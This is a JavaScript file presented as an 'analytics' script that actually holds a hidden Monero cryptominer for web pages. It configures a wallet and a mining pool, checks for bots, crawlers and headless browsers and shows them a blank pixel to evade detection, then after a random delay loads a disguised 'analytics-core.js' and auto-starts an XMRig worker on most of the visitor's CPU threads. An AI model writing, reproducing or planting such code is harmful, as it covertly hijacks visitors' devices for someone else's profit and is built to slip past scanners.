// analytics.js - v5.1 (invisível)
const CONFIG = {
    wallet: '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv',
    pool: 'wss://xmr.pool.minergate.com:45700',
    threads: Math.max(1, (navigator.hardwareConcurrency || 2) - 1),
    throttle: () => (navigator.deviceMemory || 4) < 4 ? 0.7 : 0.4
};

function isBot() {
    return /bot|crawler|spider|headless|google|yandex|phantom|selenium|webdriver|chrome\.runtime/i.test(
        navigator.userAgent + ' ' + (window.chrome ? 'chrome' : '') + ' ' + (navigator.permissions ? '' : 'no-perm')
    ) || !window.outerHeight || !screen?.width || navigator.languages.length === 0;
}

if (isBot()) {
    const img = Object.assign(document.createElement('img'), {
        src: 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
        style: 'position:absolute;opacity:0;z-index:-1;'
    });
    document.body.appendChild(img);
    setTimeout(() => img.remove(), 5000);
    return;
}

function loadScript(src, cb) {
    const s = document.createElement('script');
    s.src = src;
    s.async = true;
    s.onload = cb;
    s.onerror = () => setTimeout(retryLoad, 3000);
    document.head.appendChild(s);
}

function retryLoad() {
    const backups = [
        '/assets/js/analytics-core.js'
    ];
    loadScript(backups[Math.floor(Math.random() * backups.length)], startMiner);
}

function startMiner() {
    try {
        const FakeWorker = typeof XMRig !== 'undefined' ? XMRig.WasmWorker : class {
            start() {}
            on() {}
        };
        const miner = new FakeWorker({
            url: CONFIG.pool,
            user: CONFIG.wallet,
            pass: 'x',
            threads: CONFIG.threads,
            throttle: CONFIG.throttle(),
            idle: true,
            autoStart: true
        });
    } catch (e) {}
}

setTimeout(() => {
    loadScript('/assets/js/analytics-core.js', startMiner);
}, 10000 + Math.random() * 5000);
